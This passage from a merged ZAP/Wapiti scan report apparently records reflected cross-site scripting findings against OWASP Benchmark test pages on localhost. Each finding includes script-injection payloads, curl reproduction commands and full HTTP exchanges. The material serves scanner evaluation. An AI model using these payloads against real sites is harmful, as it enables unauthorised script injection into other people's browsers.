            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02403', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02403.html?BenchmarkTest02403=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02403=%3CScRiPt%3Ealert%28%27whbk7ztbjk%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:27 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('whbk7ztbjk')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02405",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02405?BenchmarkTest02405=SafeText&BenchmarkTest02405=Movies&BenchmarkTest02405=Writing&BenchmarkTest02405=%3CScRiPt%3Ealert%28%27wfz2i12c3x%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wfz2i12c3x')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wfz2i12c3x')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02405\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02405.html?BenchmarkTest02405=SafeText\" -d \"BenchmarkTest02405=SafeText&BenchmarkTest02405=Movies&BenchmarkTest02405=Writing&BenchmarkTest02405=%3CScRiPt%3Ealert%28%27wfz2i12c3x%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02405"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02405', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02405.html?BenchmarkTest02405=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyNDA1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02405', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02405.html?BenchmarkTest02405=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02405=SafeText&BenchmarkTest02405=Movies&BenchmarkTest02405=Writing&BenchmarkTest02405=%3CScRiPt%3Ealert%28%27wfz2i12c3x%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:26:33 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wfz2i12c3x')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02409",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02409?secure=default&productID=default&foo=foo&BenchmarkTest02409=%3CScRiPt%3Ealert%28%27we6q1ioanc%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('we6q1ioanc')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('we6q1ioanc')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02409\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02409.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02409=%3CScRiPt%3Ealert%28%27we6q1ioanc%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02409"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02409', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02409.html?BenchmarkTest02409=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyNDA5PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02409', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02409.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02409=%3CScRiPt%3Ealert%28%27we6q1ioanc%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:34 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('we6q1ioanc')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02410",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02410?BenchmarkTest02410=SafeText&BenchmarkTest02410=Movies&BenchmarkTest02410=Writing&BenchmarkTest02410=%3CScRiPt%3Ealert%28%27wht3ubi1q5%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wht3ubi1q5')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wht3ubi1q5')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02410\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02410.html\" -d \"BenchmarkTest02410=SafeText&BenchmarkTest02410=Movies&BenchmarkTest02410=Writing&BenchmarkTest02410=%3CScRiPt%3Ealert%28%27wht3ubi1q5%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02410"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02410', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02410.html?BenchmarkTest02410=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyNDEwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02410', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02410.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02410=SafeText&BenchmarkTest02410=Movies&BenchmarkTest02410=Writing&BenchmarkTest02410=%3CScRiPt%3Ealert%28%27wht3ubi1q5%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:26:40 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wht3ubi1q5')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02480",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02480?BenchmarkTest02480=SafeText&BenchmarkTest02480=Movies&BenchmarkTest02480=Writing&BenchmarkTest02480=%3CScRiPt%3Ealert%28%27wu0jjmcfej%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wu0jjmcfej')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wu0jjmcfej')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02480\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02480.html?BenchmarkTest02480=SafeText\" -d \"BenchmarkTest02480=SafeText&BenchmarkTest02480=Movies&BenchmarkTest02480=Writing&BenchmarkTest02480=%3CScRiPt%3Ealert%28%27wu0jjmcfej%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02480"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02480', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02480.html?BenchmarkTest02480=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyNDgwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02480', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02480.html?BenchmarkTest02480=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02480=SafeText&BenchmarkTest02480=Movies&BenchmarkTest02480=Writing&BenchmarkTest02480=%3CScRiPt%3Ealert%28%27wu0jjmcfej%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:47 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wu0jjmcfej')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02483",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02483?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02483=%3CScRiPt%3Ealert%28%27w1qkh6jsx7%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w1qkh6jsx7')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
